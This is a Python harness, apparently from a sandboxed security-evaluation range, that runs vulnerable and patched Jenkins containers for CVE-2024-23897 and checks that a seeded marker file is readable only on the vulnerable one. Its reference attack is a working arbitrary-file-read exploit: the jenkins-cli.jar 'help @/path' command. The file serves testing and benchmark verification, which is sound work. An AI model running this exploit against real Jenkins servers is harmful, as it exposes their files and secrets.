from __future__ import annotations

import argparse
import hashlib
import json
import os
import socket
import subprocess
import time
from pathlib import Path
from uuid import uuid4

import httpx


APP_ROOT = Path(__file__).resolve().parents[1]
PAIR_PATH = APP_ROOT / "configs" / "stage3-cve-jenkins-2024-23897-v1.json"
RELAY_CONFIG_PATH = APP_ROOT / "configs" / "stage3a-cve-http-relay-v1.json"
CVE_COMPOSE_PATH = APP_ROOT / "cve-jenkins" / "compose.yaml"
EVENT_SCHEMA_PATH = APP_ROOT.parent / "contracts" / "verifier-ledger-event.schema.json"
CONTROL_ORIGIN = "http://127.0.0.1:18081"
RESET_HEADERS = {"X-Ruby-Reset-Token": "development-reset-only"}
MARKER = "RUBY-CVE-2024-23897-SUCCESS"
_PROJECT_PORTS: dict[str, int] = {}


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def canonical_json(value: object) -> str:
    return json.dumps(value, ensure_ascii=False, sort_keys=True, separators=(",", ":"))


def digest_bytes(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def digest(value: object) -> str:
    return digest_bytes(canonical_json(value).encode("utf-8"))


def run(
    arguments: list[str],
    *,
    cwd: Path = APP_ROOT,
    environment: dict[str, str] | None = None,
    check: bool = True,
    timeout: int = 180,
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        arguments,
        cwd=cwd,
        env=environment,
        check=check,
        timeout=timeout,
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
    )


def main_compose(*arguments: str) -> subprocess.CompletedProcess[str]:
    return run(["docker", "compose", *arguments])


def cve_compose(
    project: str,
    image: str,
    *arguments: str,
    check: bool = True,
) -> subprocess.CompletedProcess[str]:
    environment = os.environ.copy()
    environment["RUBY_JENKINS_TARGET_IMAGE"] = image
    relay = json.loads(RELAY_CONFIG_PATH.read_text(encoding="utf-8"))
    environment["RUBY_CVE_RELAY_IMAGE"] = f"nginx@{relay['image_digest']}"
    environment["RUBY_JENKINS_TARGET_PORT"] = str(
        _PROJECT_PORTS.setdefault(project, free_local_port())
    )
    return run(
        [
            "docker",
            "compose",
            "-p",
            project,
            "-f",
            str(CVE_COMPOSE_PATH),
            *arguments,
        ],
        environment=environment,
        check=check,
        timeout=240,
    )


def require_main_stack() -> None:
    response = httpx.get(f"{CONTROL_ORIGIN}/health/live", timeout=5)
    response.raise_for_status()
    for service in ("api", "evaluator"):
        if not main_compose("ps", "-q", service).stdout.strip():
            raise RuntimeError(f"main Compose service is not running: {service}")


def reset_main_stack() -> None:
    response = httpx.post(
        f"{CONTROL_ORIGIN}/internal/reset", headers=RESET_HEADERS, timeout=20
    )
    response.raise_for_status()


def main_service_image_digest(service: str) -> str:
    container_id = main_compose("ps", "-q", service).stdout.strip()
    if not container_id:
        raise RuntimeError(f"main Compose service is not running: {service}")
    return run(
        ["docker", "inspect", container_id, "--format", "{{.Image}}"]
    ).stdout.strip()


def main_compose_exec(service: str, code: str, *arguments: str) -> str:
    return main_compose(
        "exec", "-T", service, "python", "-c", code, *arguments
    ).stdout.strip()


def record_effect(trial_id: str, protected_key: str) -> None:
    code = (
        "import sys;"
        "from ruby_web.config import Settings;"
        "from ruby_web.database import Database;"
        "from ruby_web.events import record_internal_event;"
        "d=Database(Settings.from_environment().database_url);s=d.sessions();"
        "record_internal_event(s,trial_id=sys.argv[1],event_type='resource.read',"
        "subject={'authorized':'false'},object_={'resource_id':sys.argv[2]},"
        "protected_resource_key=sys.argv[2],deduplication_key='jenkins-marker-read');"
        "s.commit();s.close()"
    )
    main_compose_exec("api", code, trial_id, protected_key)


def evaluator_manifest(trial_id: str, protected_key: str) -> tuple[str, dict[str, object]]:
    predicate_id = "jenkins.cve-2024-23897.marker-read"
    subject = {"authorized": "false"}
    object_ = {"resource_id": protected_key}
    condition = {
        "deduplication_key": "jenkins-marker-read",
        "event_type": "resource.read",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": protected_key,
        "subject": subject,
        "window_seconds": 300,
    }
    manifest = {
        "contract_version": 1,
        "scenario_id": "jenkins-cve-2024-23897",
        "verifier_image_digest": main_service_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [
            {
                "predicate_id": predicate_id,
                "effect_type": "unauthorized-resource-read",
                "event_type": "resource.read",
                "subject_selector": canonical_json(subject),
                "object_selector": canonical_json(object_),
                "protected_resource_key": protected_key,
                "condition_digest": digest(condition),
                "window_seconds": 300,
                "minimum_occurrences": 1,
                "deduplication_key": "jenkins-marker-read",
            }
        ],
    }
    return predicate_id, manifest


def evaluate(trial_id: str, protected_key: str) -> tuple[dict[str, object], dict[str, object]]:
    predicate_id, manifest = evaluator_manifest(trial_id, protected_key)
    payload = canonical_json(
        {"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest}
    )
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(main_compose_exec("evaluator", code, payload)), manifest


def wait_healthy(container_id: str) -> None:
    deadline = time.monotonic() + 150
    last = "unknown"
    while time.monotonic() < deadline:
        last = run(
            [
                "docker",
                "inspect",
                container_id,
                "--format",
                "{{if .State.Health}}{{.State.Health.Status}}{{else}}{{.State.Status}}{{end}}",
            ]
        ).stdout.strip()
        if last == "healthy":
            return
        if last in {"exited", "dead", "unhealthy"}:
            break
        time.sleep(2)
    raise RuntimeError(f"Jenkins target did not become healthy: {last}")


def image_evidence(
    reference: str,
    expected_index_digest: str,
    expected_linux_amd64_digest: str,
) -> dict[str, object]:
    inspected = json.loads(run(["docker", "image", "inspect", reference]).stdout)[0]
    repo_digests = inspected.get("RepoDigests", [])
    image_tree = run(["docker", "image", "ls", "--tree", reference]).stdout
    return {
        "reference": reference,
        "image_id": inspected["Id"],
        "repo_digests": repo_digests,
        "architecture": inspected["Architecture"],
        "os": inspected["Os"],
        "size_bytes": inspected["Size"],
        "index_digest_matches": any(
            value.endswith("@" + expected_index_digest) for value in repo_digests
        ),
        "linux_amd64": inspected["Os"] == "linux" and inspected["Architecture"] == "amd64",
        "expected_linux_amd64_digest": expected_linux_amd64_digest,
        "linux_amd64_digest_prefix_matches": expected_linux_amd64_digest.removeprefix("sha256:")[:12]
        in image_tree,
        "image_tree_sha256": digest_bytes(image_tree.encode("utf-8")),
    }


def jenkins_version(container_id: str) -> str:
    result = run(
        [
            "docker",
            "exec",
            container_id,
            "sh",
            "-c",
            "curl -fsSI http://127.0.0.1:8080/login | tr -d '\\r' | sed -n 's/^X-Jenkins: //p'",
        ]
    )
    return result.stdout.strip()


def seed_marker(container_id: str) -> str:
    run(
        [
            "docker",
            "exec",
            container_id,
            "sh",
            "-c",
            "printf '%s\\n' 'RUBY-CVE-2024-23897-SUCCESS' > /tmp/ruby-cve-marker.txt && chmod 600 /tmp/ruby-cve-marker.txt",
        ]
    )
    return run(
        ["docker", "exec", container_id, "sha256sum", "/tmp/ruby-cve-marker.txt"]
    ).stdout.split()[0]


def reference_request(client_image: str, network: str) -> subprocess.CompletedProcess[str]:
    script = (
        "set -eu;"
        "curl -fsS http://target:8080/jnlpJars/jenkins-cli.jar -o /tmp/jenkins-cli.jar;"
        "java -jar /tmp/jenkins-cli.jar -s http://target:8080 help '@/tmp/ruby-cve-marker.txt'"
    )
    return run(
        [
            "docker",
            "run",
            "--rm",
            "--network",
            network,
            "--read-only",
            "--tmpfs",
            "/tmp:rw,noexec,nosuid,size=64m",
            "--memory",
            "512m",
            "--cpus",
            "1",
            "--pids-limit",
            "128",
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges:true",
            client_image,
            "sh",
            "-c",
            script,
        ],
        check=False,
        timeout=120,
    )


def container_stats(container_id: str) -> dict[str, str]:
    output = run(
        [
            "docker",
            "stats",
            "--no-stream",
            "--format",
            "{{json .}}",
            container_id,
        ]
    ).stdout.strip()
    return json.loads(output)


def remaining_project_resources(project: str) -> dict[str, list[str]]:
    containers = run(
        [
            "docker",
            "ps",
            "-a",
            "--filter",
            f"label=com.docker.compose.project={project}",
            "--format",
            "{{.ID}}",
        ]
    ).stdout.splitlines()
    networks = run(
        [
            "docker",
            "network",
            "ls",
            "--filter",
            f"label=com.docker.compose.project={project}",
            "--format",
            "{{.ID}}",
        ]
    ).stdout.splitlines()
    return {"containers": containers, "networks": networks}


def write_json(path: Path, value: object) -> None:
    path.write_text(
        json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def run_condition(
    *,
    label: str,
    release: dict[str, object],
    pair: dict[str, object],
    output_root: Path,
) -> dict[str, object]:
    project = f"rubyjenkins{label}{uuid4().hex[:10]}"
    condition_root = output_root / label
    condition_root.mkdir(parents=True)
    image = f"jenkins/jenkins@{release['image_index_digest']}"
    trial_id = uuid4().hex
    result: dict[str, object] | None = None
    target_logs = ""
    cleanup_error: str | None = None
    try:
        reset_main_stack()
        cve_compose(project, image, "up", "-d", "--no-build", "target", "relay")
        container_id = cve_compose(project, image, "ps", "-q", "target").stdout.strip()
        if not container_id:
            raise RuntimeError("CVE target container was not created")
        wait_healthy(container_id)
        actual_version = jenkins_version(container_id)
        marker_digest = "sha256:" + seed_marker(container_id)
        network = f"{project}_target"
        attack = reference_request(image, network)
        combined = attack.stdout + attack.stderr
        marker_observed = MARKER in combined
        protected_key = str(pair["reference_attack"]["protected_resource_key"])
        if marker_observed:
            record_effect(trial_id, protected_key)
        evaluation, verifier = evaluate(trial_id, protected_key)
        expected_effect = label == "vulnerable"
        image_info = image_evidence(
            image,
            str(release["image_index_digest"]),
            str(release["linux_amd64_digest"]),
        )
        stats = container_stats(container_id)
        checks = {
            "expected_version": actual_version == release["version"],
            "sealed_image_index": image_info["index_digest_matches"],
            "linux_amd64_runtime": image_info["linux_amd64"],
            "sealed_linux_amd64_manifest_prefix": image_info[
                "linux_amd64_digest_prefix_matches"
            ],
            "marker_digest": marker_digest == pair["reference_attack"]["marker_sha256"],
            "request_contains_no_secret": MARKER not in "help @/tmp/ruby-cve-marker.txt",
            "reference_effect": marker_observed is expected_effect,
            "private_evaluator_effect": evaluation["objective_achieved"] is expected_effect,
            "matched_event_count": len(evaluation["matched_event_ids"]) == (1 if expected_effect else 0),
        }
        result = {
            "condition": label,
            "trial_id": trial_id,
            "project": project,
            "version": actual_version,
            "image": image_info,
            "reference_request": {
                "command": "help @/tmp/ruby-cve-marker.txt",
                "exit_code": attack.returncode,
                "stdout_sha256": digest_bytes(attack.stdout.encode("utf-8")),
                "stderr_sha256": digest_bytes(attack.stderr.encode("utf-8")),
                "marker_observed": marker_observed,
            },
            "runtime_stats": stats,
            "objective_achieved": evaluation["objective_achieved"],
            "matched_event_ids": evaluation["matched_event_ids"],
            "event_ledger_digest": evaluation["event_ledger_digest"],
            "verifier_seal": {
                "verifier_image_digest": verifier["verifier_image_digest"],
                "event_schema_digest": verifier["event_schema_digest"],
                "condition_digest": verifier["predicates"][0]["condition_digest"],
            },
            "checks": checks,
            "passed": all(checks.values()),
        }
        (condition_root / "reference-stdout.txt").write_text(attack.stdout, encoding="utf-8")
        (condition_root / "reference-stderr.txt").write_text(attack.stderr, encoding="utf-8")
        target_logs = cve_compose(project, image, "logs", "--no-color", "target", check=False).stdout
    finally:
        cleanup = cve_compose(
            project,
            image,
            "down",
            "-v",
            "--remove-orphans",
            check=False,
        )
        if cleanup.returncode != 0:
            cleanup_error = (cleanup.stdout + cleanup.stderr).strip()
        remaining = remaining_project_resources(project)
        cleanup_checks = {
            "compose_down_succeeded": cleanup.returncode == 0,
            "no_remaining_containers": not remaining["containers"],
            "no_remaining_networks": not remaining["networks"],
        }
        write_json(
            condition_root / "cleanup.json",
            {
                "checks": cleanup_checks,
                "error": cleanup_error,
                "remaining": remaining,
            },
        )
        (condition_root / "target.log").write_text(target_logs, encoding="utf-8")
        if result is not None:
            result["cleanup"] = cleanup_checks
            result["passed"] = bool(result["passed"]) and all(cleanup_checks.values())
            write_json(condition_root / "result.json", result)
    if result is None:
        raise RuntimeError(f"condition did not produce a result: {label}")
    return result


def artifact_manifest(root: Path) -> dict[str, object]:
    entries = []
    for path in sorted(item for item in root.rglob("*") if item.is_file()):
        if path.name == "artifact-manifest.json":
            continue
        entries.append(
            {
                "path": path.relative_to(root).as_posix(),
                "sha256": digest_bytes(path.read_bytes()),
                "size_bytes": path.stat().st_size,
            }
        )
    return {"schema_version": 1, "entries": entries}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Run the sealed Jenkins CVE-2024-23897 vulnerable and fixed pair."
    )
    parser.add_argument("--output-dir", type=Path, required=True)
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output directory: {args.output_dir}")
    args.output_dir.mkdir(parents=True)
    pair = json.loads(PAIR_PATH.read_text(encoding="utf-8"))
    require_main_stack()
    results: list[dict[str, object]] = []
    failure: str | None = None
    try:
        for label in ("vulnerable", "fixed"):
            result = run_condition(
                label=label,
                release=pair[label],
                pair=pair,
                output_root=args.output_dir,
            )
            results.append(result)
            if not result["passed"]:
                failure = f"condition failed: {label}"
                break
    except Exception as error:
        failure = f"execution failed: {type(error).__name__}: {error}"
    finally:
        try:
            reset_main_stack()
        except Exception as error:
            message = f"main stack restoration failed: {error}"
            failure = f"{failure}; {message}" if failure else message
    report = {
        "schema_version": 1,
        "pair_id": pair["pair_id"],
        "cve_id": pair["cve_id"],
        "status": "passed" if failure is None and len(results) == 2 else "failed",
        "expected_conditions": 2,
        "completed_conditions": len(results),
        "results": results,
        "failure": failure,
    }
    report_path = args.output_dir / "stage3-jenkins-cve-pair-report.json"
    write_json(report_path, report)
    write_json(args.output_dir / "artifact-manifest.json", artifact_manifest(args.output_dir))
    print(canonical_json({"report": str(report_path), "status": report["status"]}))
    return 0 if report["status"] == "passed" else 1


if __name__ == "__main__":
    raise SystemExit(main())
